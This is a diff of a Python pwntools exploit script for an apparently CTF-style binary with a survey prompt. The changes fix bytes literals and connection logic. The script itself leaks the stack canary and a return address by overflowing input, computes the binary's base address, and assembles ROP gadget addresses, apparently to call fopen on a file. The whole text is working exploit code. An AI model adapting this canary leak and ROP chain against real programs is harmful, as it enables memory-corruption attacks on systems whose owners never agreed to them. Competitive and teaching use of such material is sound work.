@@ -35,7 +35,7 @@ def conn():
     if args.REMOTE:
         # Connect to remote session
         r = remote(ADDR, PORT)
-    else:
+    if args.LOCAL:
         r = process([exe.path])
     return r
 
@@ -47,7 +47,7 @@ def main():
     r = conn()
     r.recvuntil(b"Do you want to complete a survey?")
     r.sendline(b"y")
-    r.recvuntil("Do you like ctf?\n")
+    r.recvuntil(b"Do you like ctf?\n")
     r.sendline(b'a'*offset_to_canary)
     r.recvline() # recv input to new line
     leak = r.recvline()
@@ -63,17 +63,17 @@ def main():
     # getFeedback gets called a second time
     r.recvuntil(b"Do you want to complete a survey?")
     r.sendline(b"y")
-    r.recvuntil("Do you like ctf?\n")
+    r.recvuntil(b"Do you like ctf?\n")
     # leak return address to main
     r.sendline(b'a' * offset_to_ret)
     r.recvline() # recv input to new line
     ret_leak = int.from_bytes(r.recvline()[:6], 'little')
-
+    # set base address
     exe.address = ret_leak - 0x1447
 
     print(f'base address: {hex(exe.address)}')
-    fopen = p64(exe.address + 0x12ba)
 
+    fopen = p64(exe.address + 0x12ba)
     pop_rdi = p64(exe.address + 0x14d3)
     pop_rsi_r15 = p64(exe.address + 0x14d1)
     read_mode_str = p64(exe.address + 0x2008)
